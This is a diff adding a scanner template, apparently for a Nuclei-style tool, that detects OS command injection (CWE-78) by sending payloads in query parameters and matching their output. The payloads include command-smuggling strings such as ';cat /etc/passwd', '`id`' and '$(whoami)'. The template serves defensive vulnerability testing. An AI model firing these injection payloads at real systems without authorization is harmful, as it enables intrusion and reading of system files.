@@ -1,0 +1,30 @@
+id: http-command-injection
+info:
+  name: "OS Command Injection Detection"
+  severity: "Critical"
+  description: "Detects OS command injection vulnerabilities by injecting commands into request parameters."
+  compliance:
+    owasp: "A03:2021"
+    cwe: "CWE-78"
+requests:
+  - method: GET
+    path: "/"
+    attack: inject
+    inject_in: query
+    payloads:
+      - ";cat /etc/passwd"
+      - "& type C:\\Windows\\win.ini"
+      - "`id`"
+      - "$(whoami)"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0"
+          - "\\[fonts\\]"
+          - "uid=[0-9]+\\(.*?\\)"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: and
